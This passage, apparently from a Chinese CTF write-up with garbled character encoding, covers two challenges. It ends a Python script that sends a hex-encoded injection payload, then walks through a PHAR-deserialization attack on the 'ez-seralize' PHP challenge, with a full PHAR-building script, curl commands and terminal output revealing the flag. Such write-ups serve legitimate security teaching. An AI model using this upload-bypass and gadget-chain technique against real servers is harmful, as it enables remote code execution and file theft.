    # \x23 -> # æ³¨é‡Šæ‰ç»“å°¾
    wrapper = "\\x22\\x29\\x0a" + hex_payload + "\\x0a\\x23"
    return wrapper


def solve():
    final_payload = hex_encode_wish(exploit_code)
    print(f"[+] Target: {TARGET_URL}")

    session = requests.Session()

    # 1. å‘é€è®¸æ„¿ (POST)
    print("[*] Sending malicious wish...")
    try:
        resp = session.post(
            f"{TARGET_URL}/api/wishes",
            json={"wish": final_payload},
            timeout=5
        )
    except Exception as e:
        print(f"[-] POST Error: {e}")
        return

    # 2. æé€Ÿè·å–ç»“æœ (GET) - æ²¡æœ‰ä»»ä½• sleep
    print("[*] Fetching results immediately...")
    try:
        resp = session.get(f"{TARGET_URL}/api/wishes", timeout=5)
        data = resp.json()

        wishes = data.get("wishes", [])
        found_flag = False

        print("\n" + "=" * 20 + " SERVER RESPONSE " + "=" * 20)
        for res in wishes:
            # è¿‡æ»¤æ‰ç©ºè¡Œå’Œæ— å…³å†…å®¹
            if not res or not res.strip():
                continue

            print(f"[*] {res.strip()[:100]}...")  # æ‰“å°éƒ¨åˆ†å†…å®¹é¢„è§ˆ

            if "flag{" in res or "CMD_OUT" in res:
                print("\n" + "!" * 50)
                print(f"SUCCESS! Result found:\n{res.strip()}")
                print("!" * 50 + "\n")
                found_flag = True

        if not found_flag:
            print("[-] Payload executed but no flag in output. (Or cleaned up too fast)")
            # å¦‚æœè¿˜æ˜¯æ‹¿ä¸åˆ°ï¼Œå¯èƒ½éœ€è¦å¤šçº¿ç¨‹å¹¶å‘ï¼šä¸€ä¸ªçº¿ç¨‹ç–¯ç‹‚GETï¼Œä¸€ä¸ªçº¿ç¨‹POST

    except Exception as e:
        print(f"[-] GET Error: {e}")


if __name__ == "__main__":
    solve()
```

# ez-seralize

ä¸»è¦å°±æ˜¯æŠŠuploads.phpæ‰«å‡ºæ¥å°±è¡Œäº†

## ä¸€ã€é¢˜ç›®æ¦‚è¿°

é¢˜ç›®ç»™äº†ä¸€ä¸ªç®€æ˜“çš„â€œæ–‡ä»¶è¯»å–å™¨â€ï¼š

- `index.php`ï¼šé€šè¿‡ `?filename=` è¯»å–ä»»æ„æ–‡ä»¶
- `uploads.php`ï¼šæ–‡ä»¶ä¸Šä¼ 
- `function.php`ï¼šå®šä¹‰äº†ä¸‰ä¸ªç±» `A/B/C`ï¼Œçœ‹èµ·æ¥åƒæ˜¯ç»™ä½ ç”¨æ¥ååºåˆ—åŒ–åˆ©ç”¨çš„ gadget

åŒæ—¶æœ‰ä¸€è¡Œæ³¨é‡Šé‡Œçš„é…ç½®ï¼š

```bash
open_basedir=/var/www/html:/tmp
```

è¯´æ˜ PHP åªèƒ½è®¿é—® `/var/www/html` å’Œ `/tmp`ï¼Œ**ç›´æ¥è¯» `/flag/flag.txt` ä¼šå¤±è´¥**ï¼Œè¦æƒ³åŠæ³•ç»•è¿‡å»ã€‚

------

## äºŒã€ä»£ç åˆ†æ

### 1. index.phpï¼šä»»æ„æ–‡ä»¶è¯»å– + serialized å‚æ•°

æ ¸å¿ƒéƒ¨åˆ†ï¼š

```php
ini_set('display_errors', '0');
$filename = isset($_GET['filename']) ? $_GET['filename'] : null;

$balcklist = ["../","%2e","..","data://","\n","input","%0a","%","\r",
              "%0d","php://","/etc/passwd","/proc/self/environ","php:file","filter"];

if (isset($filename) && $filename !== '') {
    foreach ($balcklist as $v) {
        if (strpos($filename, $v) !== false) {
            $error = "no no no";
            break;
        }
    }

    if ($error === null) {
        if (isset($_GET['serialized'])) {
            require 'function.php';
            $file_contents= file_get_contents($filename);
        } else {
            $file_contents = file_get_contents($filename);
        }
    }
}
```

è¦ç‚¹ï¼š

- ç”¨é»‘åå•è¿‡æ»¤ `filename`ï¼Œç¦äº† `php://`ã€`data://`ã€`filter` ç­‰
- **æ²¡æœ‰ç¦ `phar://`**
- å¦‚æœå¸¦ `serialized` å‚æ•°ï¼Œä¼šå…ˆ `require 'function.php'` å† `file_get_contents($filename)`

### 2. uploads.phpï¼šæ–‡ä»¶ä¸Šä¼ å¹¶è®°å½•åˆ° /tmp/log.txt

```php
$whitelist = ['txt', 'log', 'jpg', 'jpeg', 'png', 'zip','gif','gz'];
$allowedMimes = [ ... ];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    ...
    $ext = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));
    if (!in_array($ext, $whitelist, true)) die('File extension not allowed.');

    $mime = $file['type'];
    if (!isset($allowedMimes[$ext]) || !in_array($mime, $allowedMimes[$ext], true)) die('MIME type mismatch...');

    $targetFilename = time() . '_' . $safeBaseName;

    file_put_contents('/tmp/log.txt', "upload file success: $targetFilename, MIME: $mime\n");

    $targetPath = $uploadDir . $targetFilename;
    move_uploaded_file($file['tmp_name'], $targetPath);
}
```

è¦ç‚¹ï¼š

- å¯ä»¥ä¸Šä¼  `jpg` / `zip` / `gz` ç­‰æ–‡ä»¶
- MIME ç”¨çš„æ˜¯ `$_FILES['file']['type']`ï¼Œ**å¯æ§**ï¼Œæ–¹ä¾¿ä¼ªè£…
- æˆåŠŸä¸Šä¼ åä¼šå¾€ `/tmp/log.txt` å†™ä¸€æ¡æ—¥å¿—ï¼ŒåŒ…å«çœŸæ­£ä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å
- `/tmp/log.txt` åœ¨ open_basedir èŒƒå›´å†…ï¼Œå¯ä»¥ç”¨ `index.php` è¯»

### 3. function.phpï¼šgadget é“¾

```php
class A {
    public $file;
    public $luo;
    public function __toString() {
        $function = $this->luo;
        return $function();         // æŠŠ $this->luo å½“å‡½æ•°è°ƒç”¨
    }
}

class B {
    public $a;
    public $test;
    public function __wakeup() {
        echo($this->test);          // ååºåˆ—åŒ–æ—¶è‡ªåŠ¨æ‰§è¡Œ
    }
    public function __invoke() {
        $this->a->rce_me();         // å½“å¯¹è±¡è¢«â€œå½“å‡½æ•°è°ƒç”¨â€æ—¶æ‰§è¡Œ rce_me()
    }
}

class C {
    public $b;
    public function rce_me() {
        echo "Success!\n";
        system("cat /flag/flag.txt > /tmp/flag");
    }
}
```

ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºç›®æ ‡ï¼š**æƒ³åŠæ³•è®©ååºåˆ—åŒ–å¾—åˆ°ä¸€ä¸ª B å¯¹è±¡ï¼Œè§¦å‘ `__wakeup`ï¼Œå†ä¸€è·¯è°ƒç”¨åˆ° `C::rce_me()`ã€‚**

------

## ä¸‰ã€æ¼æ´ç‚¹ä¸åˆ©ç”¨æ€è·¯

PHP çš„ `phar://` å°è£…åœ¨è®¿é—® PHAR æ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨å¯¹å…¶ **metadata åšååºåˆ—åŒ–**ã€‚
 æˆ‘ä»¬å¯ä»¥ï¼š

1. æœ¬åœ°æ„é€ ä¸€ä¸ª **æ¶æ„ PHAR æ–‡ä»¶**ï¼Œåœ¨ metadata é‡Œå¡ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„å¯¹è±¡é“¾ï¼ˆç”¨ A/B/Cï¼‰ï¼›
2. æŠŠè¿™ä¸ª PHAR ä¼ªè£…æˆ `evil.jpg` ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼›
3. ç”¨ `index.php?serialized=1&filename=phar:///var/www/html/uploads/xxx_evil.jpg/a` å»è¯»å®ƒï¼š
   - `serialized=1`ï¼šä¿è¯æœåŠ¡å™¨å…ˆ `require 'function.php'`ï¼ŒåŠ è½½ A/B/C ç±»
   - `file_get_contents('phar://...')`ï¼šè§¦å‘ PHAR metadata çš„ååºåˆ—åŒ– â†’ æ‰§è¡Œ gadget é“¾
4. `C::rce_me()` ä¼šæ‰§è¡Œ
   `system("cat /flag/flag.txt > /tmp/flag");`
5. æœ€åç”¨ `index.php?filename=/tmp/flag` æŠŠ flag è¯»å‡ºæ¥ã€‚

------

## å››ã€æ„é€ æ¶æ„ PHAR

æœ¬åœ°å†™ä¸€ä¸ª `build.php`ï¼š

```php
<?php
ini_set('phar.readonly', 0);

// æœ¬åœ°å®šä¹‰åŒåç±»ï¼Œç»“æ„è¦è·Ÿé¢˜ç›®é‡Œä¸€æ ·
class A { public $file; public $luo;
    public function __toString() {
        $f = $this->luo;
        return $f();
    }
}
class B { public $a; public $test;
    public function __wakeup() { echo($this->test); }
    public function __invoke() { $this->a->rce_me(); }
}
class C { public $b;
    public function rce_me() {}
}

@unlink('evil.phar');
$phar = new Phar('evil.phar');
$phar->startBuffering();

// PHAR å†…éƒ¨éšä¾¿æ”¾ä¸€ä¸ªæ–‡ä»¶ï¼Œåå­—å« a
$phar->addFromString('a', 'test');

// æ„é€ å¯¹è±¡é“¾ï¼šB1->__wakeup() echo A â†’ A->__toString() è°ƒ B2() â†’ B2->__invoke() è°ƒ C::rce_me()
$c  = new C();
$b2 = new B();  $b2->a    = $c;
$a  = new A();  $a->luo   = $b2;
$b1 = new B();  $b1->test = $a;   // å…¥å£å¯¹è±¡

$phar->setMetadata($b1);
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->stopBuffering();

// ä¼ªè£…æˆ jpg
rename('evil.phar', 'evil.jpg');
echo "build ok: evil.jpg\n";
```

æ‰§è¡Œï¼š

```bash
php build.php
```

å¾—åˆ° `evil.jpg`ã€‚

------

## äº”ã€å®Œæ•´åˆ©ç”¨æ­¥éª¤

å‡è®¾é¢˜ç›®åŸŸåä¸ºï¼š

```text
HOST=http://019ab091-aed5-7ede-9e5a-32a0e71c4fb8.geek.ctfplus.cn
```

ä½ æŒ‰éœ€æ›¿æ¢ã€‚

### 1. ä¸Šä¼ æ¶æ„ PHARï¼ˆä¼ªè£…æˆ jpgï¼‰

```bash
curl -X POST "$HOST/uploads.php" \
  -F "file=@evil.jpg;type=image/jpeg"
```

æˆåŠŸåé¡µé¢ä¼šæç¤ºä¸Šä¼ æˆåŠŸã€‚

### 2. é€šè¿‡ `/tmp/log.txt` æ‹¿åˆ°çœŸå®æ–‡ä»¶å

```bash
curl "$HOST/?filename=/tmp/log.txt"
```

è¿”å›ç±»ä¼¼ï¼š

```text
upload file success: 1732288123_evil.jpg, MIME: image/jpeg
```

è®°ä½è¿™ä¸ªæ–‡ä»¶åï¼š`1732288123_evil.jpg`ã€‚

### 3. åˆ©ç”¨ phar:// è§¦å‘ååºåˆ—åŒ–é“¾ï¼Œå†™ `/tmp/flag`

```bash
curl "$HOST/?serialized=1&filename=phar:///var/www/html/uploads/1732288123_evil.jpg/a"
```

å¦‚æœé“¾æ‰“é€šï¼Œä¸€èˆ¬èƒ½åœ¨å“åº”é‡Œçœ‹åˆ° `Success!`ã€‚

æ­¤æ—¶ `/tmp/flag` å·²ç»è¢«å†™å¥½ã€‚

### 4. è¯»å– `/tmp/flag` å¾—åˆ° flag

```bash
curl "$HOST/?filename=/tmp/flag"
```

è¿”å›å†…å®¹å³ä¸º flagã€‚

------

## å…­ã€æ€»ç»“

å…³é”®ç‚¹å°ç»“ï¼š

1. **open_basedir é™åˆ¶** å¯¼è‡´ä¸èƒ½ç›´æ¥è¯» `/flag/flag.txt`ï¼Œä½†å¯ä»¥è¯» `/tmp`ã€‚
2. `uploads.php` ä¸Šä¼  + `/tmp/log.txt` æ—¥å¿—ç»™äº†æˆ‘ä»¬ **ç²¾ç¡®å®šä½ä¸Šä¼ æ–‡ä»¶å** çš„èƒ½åŠ›ã€‚
3. `index.php` é»‘åå•æ²¡æœ‰æ‹¦ `phar://`ï¼Œä¸”åœ¨ `serialized=1` æ—¶ä¼šåŠ è½½ `function.php`ï¼Œ**åˆšå¥½ä¸º PHAR ååºåˆ—åŒ–å‡†å¤‡å¥½ç±»å®šä¹‰**ã€‚
4. `phar://` è§¦å‘çš„ **metadata ååºåˆ—åŒ–** é…åˆ A/B/C çš„é­”æœ¯æ–¹æ³•æ„é€  gadget é“¾ï¼Œæœ€ç»ˆæ‰§è¡Œ `system("cat /flag/flag.txt > /tmp/flag")`ã€‚
5. æœ€ååˆ©ç”¨å·²æœ‰çš„æ–‡ä»¶è¯»å–åŠŸèƒ½è¯»å– `/tmp/flag` æ‹¿åˆ° flagã€‚

```
(latt) âœ  ~ curl -X POST "http://019ab091-aed5-7ede-9e5a-32a0e71c4fb8.geek.ctfplus.cn/uploads.php" \
  -F "file=@evil.jpg;type=image/jpeg"


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure File Upload</title>
    <style>
        body {
            font-family: "Segoe UI", Arial, sans-serif;
            background: linear-gradient(135deg, #e3f2fd, #f8f9fa);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: #fff;
            padding: 2em 3em;
            border-radius: 16px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        h1 {
            color: #0078d7;
            margin-bottom: 0.8em;
            font-size: 1.6em;
        }
        input[type="file"] {
            display: block;
            margin: 1em auto;
            font-size: 0.95em;
        }
        button {
            background-color: #0078d7;
            color: white;
            border: none;
            padding: 0.6em 1.4em;
            border-radius: 6px;
            cursor: pointer;
            transition: 0.2s ease;
        }
        button:hover {
            background-color: #005ea6;
        }
        .success, .error {
            margin-top: 1em;
            padding: 0.8em;
            border-radius: 8px;
            font-weight: 600;
        }
        .success {
            background: #e8f5e9;
            color: #2e7d32;
            border: 1px solid #81c784;
        }
        .error {
            background: #ffebee;
            color: #c62828;
            border: 1px solid #ef9a9a;
        }
        .footer {
            margin-top: 1.5em;
            font-size: 0.85em;
            color: #666;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>ğŸ“¤ File Upload Portal</h1>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <button type="submit">Upload</button>
    </form>
    <div class="success"> File uploaded successfully </div>    <div class="footer">Allowed types: txt, log, jpg, jpeg, png, zip</div>
</div>
</body>
</html>
(latt) âœ  ~ curl "http://019ab091-aed5-7ede-9e5a-32a0e71c4fb8.geek.ctfplus.cn/?filename=/tmp/log.txt"
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>File Reader</title>
    <style>
        :root{
            --card-bg: #ffffff;
            --page-bg: linear-gradient(135deg,#f0f7ff 0%,#fbfbfb 100%);
            --accent: #1e88e5;
            --muted: #6b7280;
            --success: #16a34a;
            --danger: #dc2626;
            --card-radius: 12px;
            --card-pad: 20px;
        }
        html,body{height:100%;margin:0;font-family: Inter, "Segoe UI", Roboto, "Helvetica Neue", Arial;}
        body{
            background: var(--page-bg);
            display:flex;
            align-items:center;
            justify-content:center;
            padding:24px;
        }
        .card{
            width:100%;
            max-width:820px;
            background:var(--card-bg);
            border-radius:var(--card-radius);
            box-shadow: 0 10px 30px rgba(16,24,40,0.08);
            padding:var(--card-pad);
        }
        h1{margin:0 0 6px 0;font-size:18px;color:#0f172a;}
        p.lead{margin:0 0 18px 0;color:var(--muted);font-size:13px}
        form.controls{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:14px}
        input[type="text"]{
            flex:1;
            padding:10px 12px;
            border:1px solid #e6e9ef;
            border-radius:8px;
            font-size:14px;
            outline:none;
            transition:box-shadow .12s ease,border-color .12s ease;
        }
        input[type="text"]:focus{box-shadow:0 0 0 4px rgba(30,136,229,0.08);border-color:var(--accent)}
        button.btn{
            padding:10px 16px;
            background:var(--accent);
            color:white;
            border:none;
            border-radius:8px;
            cursor:pointer;
            font-weight:600;
        }
        button.btn.secondary{
            background:#f3f4f6;color:#0f172a;font-weight:600;border:1px solid #e6e9ef;
        }
        .hint{font-size:12px;color:var(--muted);margin-top:6px}
        .result{
            margin-top:14px;
            border-radius:8px;
            overflow:hidden;
            border:1px solid #e6e9ef;
        }
        .result .meta{
            padding:10px 12px;
            display:flex;
            justify-content:space-between;
            align-items:center;
            background:#fbfdff;
            font-size:13px;
            color:#111827;
        }
        .result .body{
            padding:12px;
            background:#0b1220;
            color:#e6eef8;
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace;
            font-size:13px;
            line-height:1.5;
            max-height:520px;
            overflow:auto;
            white-space:pre-wrap;
            word-break:break-word;
        }
        .alert{padding:10px 12px;border-radius:8px;font-weight:600;margin-top:12px;}
        .alert.warn{background:#fff7ed;color:#92400e;border:1px solid #ffedd5}
        .alert.error{background:#fff1f2;color:#9f1239;border:1px solid #fecaca}
        .alert.info{background:#ecfeff;color:#064e3b;border:1px solid #bbf7d0}
        .footer{margin-top:12px;font-size:12px;color:var(--muted)}
        @media (max-width:640px){
            .card{padding:16px}
            .result .meta{font-size:12px}
        }
    </style>
</head>
<body>
<div class="card">
    <h1>ğŸ“„ File Reader</h1>
    <p class="lead">åœ¨ä¸‹é¢è¾“å…¥è¦è¯»å–çš„æ–‡ä»¶</p>

    <form class="controls" method="get" action="">
        <input type="text" name="filename" value="/tmp/log.txt" />
        <button type="submit" class="btn">è¯»å–æ–‡ä»¶</button>
        <a class="btn secondary" href="">é‡ç½®</a>
    </form>


        <!--RUN printf "open_basedir=/var/www/html:/tmp\nsys_temp_dir=/tmp\nupload_tmp_dir=/tmp\n" \
    > /usr/local/etc/php/conf.d/zz-open_basedir.ini-->

            <div class="result" aria-live="polite">
            <div class="meta">
                <div>æ–‡ä»¶ï¼š/tmp/log.txt</div>
                <div style="font-size:12px;color:var(--muted)">59 bytes</div>
            </div>
            <div class="body"><pre>upload file success: 1763900242_evil.jpg, MIME: image/jpeg
</pre></div>
        </div>
    </div>
</body>
</html>
(latt) âœ  ~ curl "http://019ab091-aed5-7ede-9e5a-32a0e71c4fb8.geek.ctfplus.cn/?serialized=1&filename=phar:///var/www/html/uploads/1763900242_evil.jpg/a"
Success!
(latt) âœ  ~ curl "http://019ab091-aed5-7ede-9e5a-32a0e71c4fb8.geek.ctfplus.cn/?filename=/tmp/flag"
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>File Reader</title>
    <style>
        :root{
            --card-bg: #ffffff;
            --page-bg: linear-gradient(135deg,#f0f7ff 0%,#fbfbfb 100%);
            --accent: #1e88e5;
            --muted: #6b7280;
            --success: #16a34a;
            --danger: #dc2626;
            --card-radius: 12px;
            --card-pad: 20px;
        }
        html,body{height:100%;margin:0;font-family: Inter, "Segoe UI", Roboto, "Helvetica Neue", Arial;}
        body{
            background: var(--page-bg);
            display:flex;
            align-items:center;
            justify-content:center;
            padding:24px;
        }
        .card{
            width:100%;
            max-width:820px;
            background:var(--card-bg);
            border-radius:var(--card-radius);
            box-shadow: 0 10px 30px rgba(16,24,40,0.08);
            padding:var(--card-pad);
        }
        h1{margin:0 0 6px 0;font-size:18px;color:#0f172a;}
        p.lead{margin:0 0 18px 0;color:var(--muted);font-size:13px}
        form.controls{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:14px}
        input[type="text"]{
            flex:1;
            padding:10px 12px;
            border:1px solid #e6e9ef;
            border-radius:8px;
            font-size:14px;
            outline:none;
            transition:box-shadow .12s ease,border-color .12s ease;
        }
        input[type="text"]:focus{box-shadow:0 0 0 4px rgba(30,136,229,0.08);border-color:var(--accent)}
        button.btn{
            padding:10px 16px;
            background:var(--accent);
            color:white;
            border:none;
            border-radius:8px;
            cursor:pointer;
            font-weight:600;
        }
        button.btn.secondary{
            background:#f3f4f6;color:#0f172a;font-weight:600;border:1px solid #e6e9ef;
        }
        .hint{font-size:12px;color:var(--muted);margin-top:6px}
        .result{
            margin-top:14px;
            border-radius:8px;
            overflow:hidden;
            border:1px solid #e6e9ef;
        }
        .result .meta{
            padding:10px 12px;
            display:flex;
            justify-content:space-between;
            align-items:center;
            background:#fbfdff;
            font-size:13px;
            color:#111827;
        }
        .result .body{
            padding:12px;
            background:#0b1220;
            color:#e6eef8;
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace;
            font-size:13px;
            line-height:1.5;
            max-height:520px;
            overflow:auto;
            white-space:pre-wrap;
            word-break:break-word;
        }
        .alert{padding:10px 12px;border-radius:8px;font-weight:600;margin-top:12px;}
        .alert.warn{background:#fff7ed;color:#92400e;border:1px solid #ffedd5}
        .alert.error{background:#fff1f2;color:#9f1239;border:1px solid #fecaca}
        .alert.info{background:#ecfeff;color:#064e3b;border:1px solid #bbf7d0}
        .footer{margin-top:12px;font-size:12px;color:var(--muted)}
        @media (max-width:640px){
            .card{padding:16px}
            .result .meta{font-size:12px}
        }
    </style>
</head>
<body>
<div class="card">
    <h1>ğŸ“„ File Reader</h1>
    <p class="lead">åœ¨ä¸‹é¢è¾“å…¥è¦è¯»å–çš„æ–‡ä»¶</p>

    <form class="controls" method="get" action="">
        <input type="text" name="filename" value="/tmp/flag" />
        <button type="submit" class="btn">è¯»å–æ–‡ä»¶</button>
        <a class="btn secondary" href="">é‡ç½®</a>
    </form>


        <!--RUN printf "open_basedir=/var/www/html:/tmp\nsys_temp_dir=/tmp\nupload_tmp_dir=/tmp\n" \
    > /usr/local/etc/php/conf.d/zz-open_basedir.ini-->

            <div class="result" aria-live="polite">
            <div class="meta">
                <div>æ–‡ä»¶ï¼š/tmp/flag</div>
                <div style="font-size:12px;color:var(--muted)">37 bytes</div>
            </div>
            <div class="body"><pre>SYC{019ab091aec174ea9921a47796a31d85}</pre></div>
        </div>
    </div>
</body>
</html>
```

